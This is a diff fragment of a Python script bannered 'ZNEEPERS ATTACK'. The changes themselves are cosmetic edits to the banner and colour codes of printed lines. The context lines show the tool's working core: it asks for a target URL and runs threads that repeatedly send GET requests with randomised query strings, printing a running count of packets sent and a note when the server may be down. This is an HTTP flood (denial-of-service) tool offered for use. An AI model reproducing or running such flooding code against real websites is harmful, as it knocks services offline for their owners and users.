@@ -40,7 +40,7 @@ print("\033[1m             Z  N  E  E  P  E  R  S    A  T  T  A  C  K           
 print("\033[33m                         design By: ZA'99                             \033[0m")   
 print("\033[1m                   —°0  please use wisely  0°—                         \033[0m")    
 print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")      
-print("\033[32m-------------------------------->>>\033[0m")
+print("\033[32m======================================================================\033[0m")
 url = input("URL:  ").strip()
 
 u = int(0)
@@ -86,7 +86,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("\033[92m[\033[97m+\033[92m]\033[92mNOZZ: " +str(u)+ " \033[95mMENGIRIMKAN PAKET ke" +str()+ " \033[1m" +url+ "\033[0m" )
+                print("\033[92m[\033[97m+\033[92m]\033[92mNOZZ: " +str(u)+ " \033[95mMENGIRIMKAN PAKET ke" +str()+ " \033[97m" +url+ "\033[0m" )
     
             except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
